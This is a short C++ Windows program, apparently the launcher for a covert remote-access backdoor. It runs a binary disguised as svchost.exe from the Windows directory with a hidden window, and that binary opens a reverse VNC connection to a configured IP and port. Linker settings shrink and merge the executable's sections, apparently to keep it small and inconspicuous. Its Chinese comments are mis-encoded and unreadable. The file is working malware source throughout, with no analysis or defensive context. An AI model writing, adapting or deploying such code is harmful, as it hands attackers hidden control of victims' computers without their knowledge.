// 1.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<windows.h>
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"kernel32.lib") 

#pragma comment(linker, "/OPT:NOWIN98")   //ȡ����4�е�ע�ͣ��ɱ����2K����ļ� 
#pragma comment(linker, "/merge:.data=.text")    
#pragma comment(linker, "/merge:.rdata=.text")    
#pragma comment(linker, "/align:0x200") 
#pragma comment(linker, "/ENTRY:run")    
#pragma comment(linker, "/subsystem:windows") 

void run()
{
	char pas[MAX_PATH]={0};
    GetWindowsDirectory(pas,MAX_PATH);

	char cmd[35]="\\svchost.exe vnc.dll,VNC -connect ";
    char ip[16]="127.127.127.127";
    char port[6]="5500";
	
	strcat(pas,cmd);
	strcat(pas,ip);
    strcat(pas,":");
	strcat(pas,port);
	
	STARTUPINFO si; //��������ʱ��Ҫ��ʼ���Ľṹ
    PROCESS_INFORMATION pi; //������������й���Ϣ
    si.cb = sizeof(STARTUPINFO);
    GetStartupInfo(&si); 
    si.wShowWindow = SW_HIDE;//�������ô���Ϊ��ʾ��SW_HIDEΪ���ش���
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    //CreateProcess(NULL,
    //cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi);

    if(!CreateProcess(NULL,pas,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi))
	{
       //MessageBox(0,pas,"����", MB_OK);
	}

}
